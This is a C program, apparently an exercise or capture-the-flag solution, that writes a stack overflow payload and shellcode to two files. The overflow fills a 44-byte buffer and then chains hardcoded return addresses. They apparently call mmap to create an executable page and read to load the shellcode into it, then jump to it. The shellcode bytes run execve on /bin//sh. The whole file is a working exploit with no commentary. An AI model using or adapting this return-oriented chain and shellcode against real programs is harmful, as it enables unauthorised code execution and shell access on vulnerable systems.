#include <inttypes.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>


int main(int argc, char **argv)
{
	struct _overflow {
		char buf[44]; //44
		uint32_t ebp;
		uint32_t retToMap;
		uint32_t retToPop11;
		uint32_t buff_addr;
		uint32_t map_size;
		uint32_t map_prot;
		uint32_t map_flag;
		uint32_t map_fd;
		uint32_t map_offset;
		uint32_t padding7;
		uint32_t padding8;
		uint32_t padding9;
		uint32_t padding10;
		uint32_t padding11;
		uint32_t retToRead;
		uint32_t retToPop3;
		uint32_t read_fd;
		uint32_t read_buf_addr;
		uint32_t read_size;
		uint32_t shellcode_addr;
	} __attribute__((packed)) overflow;

	char shellcode[] = {
		0x31, 0xc0, 0x50, 0x68, 0x6e, 0x2f, 0x73, 0x68, 0x68,
		0x2f, 0x2f, 0x62, 0x69, 0x89, 0xe3, 0x50, 0x89, 0xe2, 0x53, 0x89, 0xe1,
		0xb0, 0x0b, 0xcd, 0x80
	};



	memset(&overflow, 'B', sizeof(overflow));

	//overflow.retToMap = 0x80483c0;
	overflow.retToMap = 0x80483b0;
	overflow.retToPop11 = 0x8048669;
	overflow.buff_addr = 4096 * 30000;
	overflow.map_size = 4096;
	overflow.map_prot = 0x7;
	overflow.map_flag = 0x32;
	overflow.map_fd = -1;
	overflow.map_offset = 0;
	overflow.retToRead = 0x8048370;
	overflow.retToPop3 = 0x804866d;
	overflow.read_fd = 0;
	overflow.read_buf_addr = overflow.buff_addr;
	overflow.read_size = 100;
	overflow.shellcode_addr = overflow.buff_addr;

	//write the overflow file
	int fd = open("return", O_WRONLY | O_CREAT, 0644);

	ftruncate(fd, 0);

	write(fd, (char*)&overflow, sizeof(overflow));

	close(fd);

	//write the shellcode file
	fd = open("shellcode", O_WRONLY | O_CREAT, 0644);

	ftruncate(fd, 0);

	write(fd, (char*)&shellcode, sizeof(shellcode));

	close(fd);




	return EXIT_FAILURE;
}
